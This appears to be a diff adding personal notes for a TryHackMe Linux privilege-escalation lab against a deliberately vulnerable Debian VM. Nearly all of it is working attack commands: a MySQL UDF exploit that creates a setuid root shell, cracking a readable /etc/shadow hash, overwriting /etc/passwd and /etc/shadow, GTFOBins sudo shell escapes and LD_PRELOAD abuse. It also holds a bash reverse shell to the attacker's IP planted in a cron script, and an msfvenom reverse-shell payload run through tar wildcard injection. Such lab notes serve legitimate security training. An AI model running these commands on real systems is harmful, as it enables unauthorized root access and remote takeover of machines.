@@ -1,0 +1,255 @@
+#Task 1 Deploy the Vulnerable Debian VM 
+- Deploy the machine and login to the "user" account using SSH.
+hint: ssh user@10.10.201.78
+no answer
+
+- Run the "id" command. What is the result?
+hint: id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+
+#Task 2 Service Exploits 
+cd /home/user/tools/mysql-udf
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root
+mysql>use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+exit;
+/tmp/rootbash -p
+#whoami
+root
+rm /tmp/rootbash
+
+
+#Task 3 Weak File Permissions - Readable /etc/shadow 
+ls -l /etc/shadow
+cat /etc/shadow
+cp root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+on kali machine:
+vi hash.txt
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+- What is the root user's password hash?
+hint: run john --view hash
+or echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash2.txt | hashid -m
+sha512crypt
+
+
+- What is the root user's password?
+password123
+
+
+#Task 4 Weak File Permissions - Writable /etc/shadow 
+ls -l /etc/shadow
+mkpasswd -m sha-512 newpasswordhere
+vi /etc/shadow
+paste hash to
+su root
+
+- Read and follow along with the above.
+no answer
+
+
+# Task 5 Weak File Permissions - Writable /etc/passwd 
+ls -l /etc/passwd
+openssl passwd newpasswordhere
+
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+su root
+
+change root -->newroot
+and placing the generated password hash between the first and second colon (replacing the "x").
+su newroot
+
+Run the "id" command as the newroot user. What is the result?
+answer: uid=0(root) gid=0(root) groups=0(root)
+nor? uid=0(newroot) gid=0(root) groups=0(root)
+
+#Task 6 Sudo - Shell Escape Sequences 
+sudo -l
+Visit GTFOBins (https://gtfobins.github.io
+OR https://github.com/t0thkr1s/gtfo
+git clone https://github.com/t0thkr1s/gtfo
+cd gtfo
+python3 setup.py install
+python3 gtpo.py vim
+
+- How many programs is "user" allowed to run via sudo? 
+sudo -l 
+sudo -l | grep "(root)" | wc -l
+11
+
+- One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
+apache2
+
+
+- Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.
+sudo -l
+sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+    
+    
++ (root) NOPASSWD: /usr/sbin/iftop
+hint: python3 gtfo.py iftop
+search iftop https://gtfobins.github.io
+sudo iftop
+!/bin/sh
+
++ (root) NOPASSWD: /usr/bin/find
+hint: python3 gtfo.py find | grep sudo
+search find https://gtfobins.github.io
+sudo find . -exec /bin/sh \; -quit
+
++ (root) NOPASSWD: /usr/bin/nano
+hint: python3 gtfo.py nano
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+(sudo nano
+Ctrl +R && Ctrl +X
+reset; sh 1>&0 2>&0)
+
++ (root) NOPASSWD: /usr/bin/vim
+hint: python3 gtfo.py vim | grep sudo
+sudo vim -c ':!/bin/sh'
+sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+sudo vim -c ':lua os.execute("reset; exec sh")'
+
+
++ (root) NOPASSWD: /usr/bin/man
+hint: python3 gtfo.py man
+sudo man man
+!/bin/sh
+
++(root) NOPASSWD: /usr/bin/awk
+hint: python3 gtfo.py awk | grep sudo
+sudo awk 'BEGIN {system("/bin/sh")}'
+
++ (root) NOPASSWD: /usr/bin/less
+hint: python3 gtfo.py less
+sudo less /etc/profile
+!/bin/sh
+
++ (root) NOPASSWD: /usr/bin/ftp
+hint: python3 gtfo.py ftp
+sudo ftp
+!/bin/shsudo ftp
+!/bin/sh
+
+
++ (root) NOPASSWD: /usr/bin/nmap
+hint: python3 gtfo.py nmap
+# Input echo is disabled.
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+
+-  -  -  -  -  -  -  -  -  - 
+
+# The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+sudo nmap --interactive
+nmap> !sh
+
++ (root) NOPASSWD: /bin/more
+hint: python3 gtfo.py more
+TERM= sudo more /etc/profile
+!/bin/sh
+
+
+#Task 7 Sudo - Environment Variables 
+sudo -l
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+ldd /usr/sbin/apache2
+exit
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp apache2
+
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 8 Cron Jobs - File Permissions 
+cat /etc/crontab
+locate overwrite.sh
+ls -l /usr/local/bin/overwrite.sh
+echo 'bash -i >& /dev/tcp/$IPlocal/4444 0>&1' > /usr/local/bin/overwrite.sh
+on kali machine
+nc -nvlp 4444
+
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 9 Cron Jobs - PATH Environment Variable 
+cat /etc/crontab
+cd /home/user
+vi overwrite.sh
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+chmod +x /home/user/overwrite.sh
+/tmp/rootbash -p
+rm /tmp/rootbash
+exit
+
+- What is the value of the PATH variable in /etc/crontab?
+/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+#Task 10 Cron Jobs - Wildcards 
+on kali machine:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IpLOCAL LPORT=4444 -f elf -o shell.elf
+On target machine: 
+chmod +x shell.elf
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+--> on kali machine: nc -lnvp 4444
+whoami
+root
+
+final:
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+
+- Read and follow along with the above.
+no answer
+
+
+https://tryhackme.com/room/linuxprivesc
+https://therandomier.medium.com/tryhackme-linux-privesc-9ea2cfac3b76
+https://www.aldeid.com/wiki/TryHackMe-Linux-PrivEsc
+https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5
+https://0xsanz.medium.com/linux-privesc-tryhackme-a41eddc5b595
+
+
+https://github.com/t0thkr1s/gtfo
+search for https://gtfobins.github.io/gtfobins/tar/
+
+
